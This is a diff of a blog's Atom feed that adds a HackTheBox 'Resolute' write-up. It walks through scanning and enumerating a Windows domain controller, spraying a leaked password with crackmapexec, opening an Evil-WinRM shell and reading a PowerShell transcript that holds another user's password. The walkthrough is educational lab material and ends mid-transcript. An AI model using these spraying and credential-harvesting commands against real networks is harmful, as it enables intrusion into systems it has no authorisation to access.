@@ -1,5 +1,412 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-05-11T10:05:00+02:00</updated><entry><title>HTB: Obscurity</title><link href="https://maggick.fr/2020/05/htb-obscurity.html" rel="alternate"></link><published>2020-05-11T10:05:00+02:00</published><updated>2020-05-11T10:05:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-11:/2020/05/htb-obscurity.html</id><summary type="html">&lt;p&gt;&lt;img alt="Obscurity card" class="align-left" src="/media/2020.05/obscurity_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-05-31T17:45:00+02:00</updated><entry><title>HTB: Resolutre</title><link href="https://maggick.fr/2020/05/htb-resolutre.html" rel="alternate"></link><published>2020-05-31T17:45:00+02:00</published><updated>2020-05-31T17:45:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-31:/2020/05/htb-resolutre.html</id><summary type="html">&lt;p&gt;&lt;img alt="Resolute Card" class="align-left" src="/media/2020.05/resolute_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/220"&gt;Resolute&lt;/a&gt;.
+This box was created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and publish on
+December the 7th 2019. The box is rated as a medium box. It implies a lot of
+enumeration and really interesting privilege escalation in Windows environment
+using DLL injection.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.05/resolute_card.png" alt="Resolute Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/220"&gt;Resolute&lt;/a&gt;.
+This box was created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and publish on
+December the 7th 2019. The box is rated as a medium box. It implies a lot of
+enumeration and really interesting privilege escalation in Windows environment
+using DLL injection.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. As this is again (like with forest) a
+domain contronler a few ports are open. So much ports are open that a full
+TCPscan will take more than a day.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nmap -p- -sS 10.10.10.169 -oA nmap&lt;/span&gt;
+&lt;span class="code-line"&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-10 09:49 EST&lt;/span&gt;
+&lt;span class="code-line"&gt;Stats: 0:10:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan&lt;/span&gt;
+&lt;span class="code-line"&gt;SYN Stealth Scan Timing: About 11.50% done; ETC: 11:22 (1:21:43 remaining)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Therefore we launch a basic nmap scan on the top 10 000 ports, 14 of them are
+open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Dec 13 03:00:17 2019 as: nmap -sS -oA nmap --top-ports 10000 10.10.10.169&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for megabank.local (10.10.10.169)&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.34s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 8306 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;53/tcp    open  domain&lt;/span&gt;
+&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec&lt;/span&gt;
+&lt;span class="code-line"&gt;135/tcp   open  msrpc&lt;/span&gt;
+&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn&lt;/span&gt;
+&lt;span class="code-line"&gt;389/tcp   open  ldap&lt;/span&gt;
+&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds&lt;/span&gt;
+&lt;span class="code-line"&gt;464/tcp   open  kpasswd5&lt;/span&gt;
+&lt;span class="code-line"&gt;593/tcp   open  http-rpc-epmap&lt;/span&gt;
+&lt;span class="code-line"&gt;636/tcp   open  ldapssl&lt;/span&gt;
+&lt;span class="code-line"&gt;3268/tcp  open  globalcatLDAP&lt;/span&gt;
+&lt;span class="code-line"&gt;3269/tcp  open  globalcatLDAPssl&lt;/span&gt;
+&lt;span class="code-line"&gt;5985/tcp  open  wsman&lt;/span&gt;
+&lt;span class="code-line"&gt;9389/tcp  open  adws&lt;/span&gt;
+&lt;span class="code-line"&gt;47001/tcp open  winrm&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Fri Dec 13 03:07:34 2019 -- 1 IP address (1 host up) scanned in 437.35 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We run a version scan on this open ports. The ports 138 and 445 (SMB) are open
+as well as port 5985 and 47001 for winRM.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Dec 13 03:10:58 2019 as: nmap -sSV -oA service -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.10.169&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for megabank.local (10.10.10.169)&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.70s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE  SERVICE      VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;53/tcp    closed domain&lt;/span&gt;
+&lt;span class="code-line"&gt;88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-13 08:19:12Z)&lt;/span&gt;
+&lt;span class="code-line"&gt;135/tcp   open   msrpc        Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn&lt;/span&gt;
+&lt;span class="code-line"&gt;389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)&lt;/span&gt;
+&lt;span class="code-line"&gt;445/tcp   open   microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)&lt;/span&gt;
+&lt;span class="code-line"&gt;464/tcp   open   kpasswd5?&lt;/span&gt;
+&lt;span class="code-line"&gt;593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
+&lt;span class="code-line"&gt;636/tcp   open   tcpwrapped&lt;/span&gt;
+&lt;span class="code-line"&gt;3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)&lt;/span&gt;
+&lt;span class="code-line"&gt;3269/tcp  open   tcpwrapped&lt;/span&gt;
+&lt;span class="code-line"&gt;5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
+&lt;span class="code-line"&gt;9389/tcp  open   mc-nmf       .NET Message Framing&lt;/span&gt;
+&lt;span class="code-line"&gt;47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Fri Dec 13 03:11:28 2019 -- 1 IP address (1 host up) scanned in 30.41 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We enumerate the box using
+&lt;a href="https://github.com/portcullislabs/enum4linux"&gt;enum4linux&lt;/a&gt; we got a list of
+account and a description with a password in it &lt;code&gt;Welcome123!&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;perl enum4linux.pl 10.10.10.169&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;=============================&lt;/span&gt;
+&lt;span class="code-line"&gt;|    Users on 10.10.10.169    |&lt;/span&gt;
+&lt;span class="code-line"&gt;=============================&lt;/span&gt;
+&lt;span class="code-line"&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 866.&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail  Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela   Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette  Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika   Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire   Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude   Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia  Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo  Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus   Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak   Desc: Account created. Password set to Welcome123!&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie  Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki    Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo    Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally    Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon    Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve    Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie   Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita   Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The creds doesn't work and doesn't allow to access the SMB share. We put all
+users in a file &lt;code&gt;users.txt&lt;/code&gt; and then we use
+&lt;a href="https://github.com/byt3bl33d3r/CrackMapExec"&gt;crackmapexec&lt;/a&gt; to spray the
+password against all accounts. The &lt;code&gt;melanie&lt;/code&gt; account is using the password!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;crackmapexec smb 10.10.10.169 -u users.txt -p &amp;#39;Welcome123!&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:MEGABANK)&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Administrator:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Guest:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\krbtgt:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\ryan:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marko:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\sunita:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\abigail:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marcus:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\sally:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\fred:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\angela:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\felicia:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\gustavo:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\ulf:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\stevie:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claire:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\paulo:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\steve:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annette:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annika:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\per:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claude:Welcome123! STATUS_LOGON_FAILURE&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [+] MEGABANK\melanie:Welcome123!&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can then enumerate the shares but nothing interesting.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;crackmapexec smb 10.10.10.169 -u melanie -p &amp;#39;Welcome123!&amp;#39; --shares&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:MEGABANK)&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [+] MEGABANK\melanie:Welcome123!&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        [+] Enumerating shares&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        SHARE           Permissions&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        -----           -----------&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        NETLOGON        READ&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        SYSVOL          READ&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        ADMIN$          NO ACCESS&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        IPC$            READ&lt;/span&gt;
+&lt;span class="code-line"&gt;CME          10.10.10.169:445 RESOLUTE        C$              NO ACCESS&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can then use &lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt; to
+connect using Winrm. This let us get the user flag in &lt;code&gt;melanie&lt;/code&gt; home folder.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ruby evil-winrm.rb -u melanie -p &amp;#39;Welcome123!&amp;#39; -i 10.10.10.169&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\melanie\Documents&amp;gt; type ..\Desktop\user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;0c3be45fcfe249796ccbee8d3a978540&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="second-user"&gt;Second user&lt;/h1&gt;
+&lt;p&gt;We start enumerating the box. We can even run a
+&lt;a href="https://github.com/fox-it/BloodHound.py"&gt;Bloodhound&lt;/a&gt; at it.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Melanie's groups" src="/media/2020.05/resolute_1.png"&gt;&lt;/p&gt;
+&lt;p&gt;Nothing really interesting except when looking thoroughly at the content of the &lt;code&gt;C:\&lt;/code&gt; folder.
+We found a &lt;code&gt;PSTranscripts&lt;/code&gt; folder. A
+&lt;a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript"&gt;PSTranscript&lt;/a&gt;
+is simply a transcript of a powershell session.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; dir -force&lt;/span&gt;
+&lt;span class="code-line"&gt;    Directory: C:\&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
+&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN&lt;/span&gt;
+&lt;span class="code-line"&gt;d--hsl        9/25/2019  10:17 AM                Documents and Settings&lt;/span&gt;
+&lt;span class="code-line"&gt;d-----        9/25/2019   6:19 AM                PerfLogs&lt;/span&gt;
+&lt;span class="code-line"&gt;d-r---        9/25/2019  12:39 PM                Program Files&lt;/span&gt;
+&lt;span class="code-line"&gt;d-----       11/20/2016   6:36 PM                Program Files (x86)&lt;/span&gt;
+&lt;span class="code-line"&gt;d--h--        9/25/2019  10:48 AM                ProgramData&lt;/span&gt;
+&lt;span class="code-line"&gt;d--h--        12/3/2019   6:32 AM                PSTranscripts&lt;/span&gt;
+&lt;span class="code-line"&gt;d--hs-        9/25/2019  10:17 AM                Recovery&lt;/span&gt;
+&lt;span class="code-line"&gt;d--hs-        9/25/2019   6:25 AM                System Volume Information&lt;/span&gt;
+&lt;span class="code-line"&gt;d-r---        12/4/2019   2:46 AM                Users&lt;/span&gt;
+&lt;span class="code-line"&gt;d-----        12/4/2019   5:15 AM                Windows&lt;/span&gt;
+&lt;span class="code-line"&gt;-arhs-       11/20/2016   5:59 PM         389408 bootmgr&lt;/span&gt;
+&lt;span class="code-line"&gt;-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT&lt;/span&gt;
+&lt;span class="code-line"&gt;-a-hs-       12/11/2019   8:48 AM      402653184 pagefile.sys&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We go through the folder until finding the transcript text file. Then we display
+it. Inside we see a few commands and then a backup command using the &lt;code&gt;ryan&lt;/code&gt; user
+and its password &lt;code&gt;Serv3r4Admin4cc123!&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; dir -force PSTranscripts\&lt;/span&gt;
+&lt;span class="code-line"&gt;    Directory: C:\PSTranscripts&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
+&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;d--h--        12/3/2019   6:45 AM                20191203&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\&amp;gt; dir -force PSTranscripts\20191203\&lt;/span&gt;
+&lt;span class="code-line"&gt;    Directory: C:\PSTranscripts\20191203&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
+&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\&amp;gt; type PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;**********************&lt;/span&gt;
+&lt;span class="code-line"&gt;Windows PowerShell transcript start&lt;/span&gt;
+&lt;span class="code-line"&gt;Start time: 20191203063201&lt;/span&gt;
+&lt;span class="code-line"&gt;Username: MEGABANK\ryan&lt;/span&gt;
+&lt;span class="code-line"&gt;RunAs User: MEGABANK\ryan&lt;/span&gt;
+&lt;span class="code-line"&gt;Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding&lt;/span&gt;
+&lt;span class="code-line"&gt;Process ID: 2800&lt;/span&gt;
+&lt;span class="code-line"&gt;PSVersion: 5.1.14393.2273&lt;/span&gt;
+&lt;span class="code-line"&gt;PSEdition: Desktop&lt;/span&gt;
+&lt;span class="code-line"&gt;PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273&lt;/span&gt;
+&lt;span class="code-line"&gt;BuildVersion: 10.0.14393.2273&lt;/span&gt;
+&lt;span class="code-line"&gt;CLRVersion: 4.0.30319.42000&lt;/span&gt;
+&lt;span class="code-line"&gt;WSManStackVersion: 3.0&lt;/span&gt;
+&lt;span class="code-line"&gt;PSRemotingProtocolVersion: 2.3&lt;/span&gt;
+&lt;span class="code-line"&gt;SerializationVersion: 1.1.0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;**********************&lt;/span&gt;
+&lt;span class="code-line"&gt;Command start time: 20191203063455&lt;/span&gt;
+&lt;span class="code-line"&gt;**********************&lt;/span&gt;
+&lt;span class="code-line"&gt;PS&amp;gt;TerminatingError(): &amp;quot;System error.&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;&amp;gt; CommandInvocation(Invoke-Expression): &amp;quot;Invoke-Expression&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;&amp;gt; ParameterBinding(Invoke-Expression): name=&amp;quot;Command&amp;quot;; value=&amp;quot;-join($id,&amp;#39;PS &amp;#39;,$(whoami),&amp;#39;@&amp;#39;,$env:computername,&amp;#39; &amp;#39;,$((gi $pwd).Name),&amp;#39;&amp;gt; &amp;#39;)&lt;/span&gt;
+&lt;span class="code-line"&gt;if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;&amp;gt; CommandInvocation(Out-String): &amp;quot;Out-String&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;&amp;gt; ParameterBinding(Out-String): name=&amp;quot;Stream&amp;quot;; value=&amp;quot;True&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;**********************&lt;/span&gt;
+&lt;span class="code-line"&gt;Command start time: 20191203063455&lt;/span&gt;
+&lt;span class="code-line"&gt;**********************&lt;/span&gt;
+&lt;span class="code-line"&gt;PS&amp;gt;ParameterBinding(Out-String): name=&amp;quot;InputObject&amp;quot;; value=&amp;quot;PS megabank\ryan@RESOLUTE Documents&amp;gt; &amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;PS megabank\ryan@RESOLUTE Documents&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;**********************&lt;/span&gt;
+&lt;span class="code-line"&gt;Command start time: 20191203063515&lt;/span&gt;
+&lt;span class="code-line"&gt;**********************&lt;/span&gt;
